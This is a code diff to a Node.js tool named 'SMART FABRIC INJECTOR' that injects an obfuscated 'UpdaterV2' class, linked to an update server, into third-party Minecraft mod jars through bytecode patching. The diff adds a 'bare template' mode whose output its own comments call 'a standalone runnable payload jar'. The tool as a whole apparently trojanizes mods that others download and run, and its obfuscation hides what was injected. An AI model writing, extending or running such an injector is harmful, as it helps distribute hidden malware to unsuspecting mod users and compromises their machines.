@@ -6,6 +6,9 @@ const crypto = require("crypto");
 const AdmZip = require("adm-zip");
 const { execFileSync } = require("child_process");
 const OBFUSCATE_DEFAULT = "1";
+// Bare template mode: build a jar that contains nothing but the injected
+// class (UpdaterV2) with obfuscation applied — no third-party mod target.
+const BARE_TEMPLATE = process.env.BARE_TEMPLATE === "1";
 
 console.log("====================================");
 console.log(" SMART FABRIC INJECTOR (bytecode edition)");
@@ -194,7 +197,7 @@ function buildUpdaterV2(sourcePath, zip, updateServerUrl) {
 // --------------------------------------------------
 // 1. Validate inputs
 // --------------------------------------------------
-if (!fs.existsSync(targetJar)) {
+if (!BARE_TEMPLATE && !fs.existsSync(targetJar)) {
   console.log("[ERROR] JAR not found");
   process.exit(1);
 }
@@ -203,8 +206,10 @@ if (!fs.existsSync(UpdaterV2Java)) {
   console.log("[ERROR] Missing source: " + UpdaterV2Java);
   process.exit(1);
 }
-const zip = new AdmZip(targetJar);
-console.log("[DEBUG] Opened JAR");
+// Bare template mode starts from an empty archive; the finished jar holds
+// nothing but the injected class (+ manifest) and obfuscation artifacts.
+const zip = BARE_TEMPLATE ? new AdmZip() : new AdmZip(targetJar);
+console.log(BARE_TEMPLATE ? "[DEBUG] Bare template mode (no mod target)" : "[DEBUG] Opened JAR");
 
 let UpdaterV2;
 try {
@@ -228,7 +233,7 @@ if (zip.getEntry(UpdaterV2.jarEntry)) {
 console.log("[DEBUG] Prepared injd class entry: " + UpdaterV2.jarEntry);
 
 // --------------------------------------------------
-// 4. Detect Mod Loader and Extract Entrypoints
+// 4. Detect Mod Loader and Extract Entrypoints (skipped in bare mode)
 // --------------------------------------------------
 let loaderType = "unknown";
 let fabricJson = null;
@@ -236,6 +241,7 @@ let quiltJson = null;
 let targetClassName = "auto";
 let targetMethodName = "auto";
 
+if (!BARE_TEMPLATE) {
 const fabricEntry = zip.getEntry("fabric.mod.json");
 const quiltEntry = zip.getEntry("quilt.mod.json");
 const forgeEntry = zip.getEntry("META-INF/mods.toml");
@@ -351,6 +357,7 @@ if (loaderType === "fabric" && fabricJson) {
     );
   }
 }
+} // end if (!BARE_TEMPLATE)
 
 const enableobf2 =
   String(process.env.ENABLE_OBF2 || process.env.ENABLE_obf2 || OBFUSCATE_DEFAULT) === "1";
@@ -359,15 +366,30 @@ const extractedMixinClasses = enableobf2
   : [];
 
 // --------------------------------------------------
-// 5. Execute Bytecode Injection via Java tool
+// 5. Build output jar (Bytecode injection, or bare minimal jar)
 // --------------------------------------------------
-const targetBasename = path.basename(targetJar, ".jar");
+const targetBasename = BARE_TEMPLATE
+  ? "injected-naked"
+  : path.basename(targetJar, ".jar");
 const outDir = outputDir ? path.resolve(outputDir) : path.dirname(targetJar);
 if (outputDir && !fs.existsSync(outDir)) {
   fs.mkdirSync(outDir, { recursive: true });
 }
 const injdOutput = path.join(outDir, `${targetBasename}-injd.jar`);
 
+if (BARE_TEMPLATE) {
+  // Produce a jar containing nothing but the injected class. The manifest
+  // Main-Class points at UpdaterV2 (kept by the obfuscator), so the result
+  // is a standalone runnable payload jar.
+  const bareZip = new AdmZip();
+  const manifest =
+    "Manifest-Version: 1.0\r\n" +
+    "Main-Class: " + UpdaterV2.binaryName + "\r\n\r\n";
+  bareZip.addFile("META-INF/MANIFEST.MF", Buffer.from(manifest, "utf8"));
+  bareZip.addFile(UpdaterV2.jarEntry, fs.readFileSync(UpdaterV2.classPathTmp));
+  bareZip.writeZip(injdOutput);
+  console.log("[DEBUG] Built bare template jar with only the injected class");
+} else {
 console.log("[DEBUG] Executing ByteCodeInjector JAR patching...");
 ensureAsmJar();
 ensureByteCodeInjector();
@@ -391,6 +413,7 @@ try {
   console.log("[ERROR] ByteCodeInjector execution failed");
   console.error(e);
   process.exit(1);
+}
 }
 
 // --------------------------------------------------
@@ -597,7 +620,7 @@ async function runobf2(inputJar, mixinClasses) {
     return inputJar;
   }
 
-  const outputJar = inputJar.replace(/\.jar$/i, "-fabric-obf.jar");
+  const outputJar = inputJar.replace(/\.jar$/i, "-obf.jar");
   const seed = Math.floor(Math.random() * 1_000_000_000).toString();
   const aggressive = String(process.env.OBF2_AGGRESSIVE || "1") === "1";
 
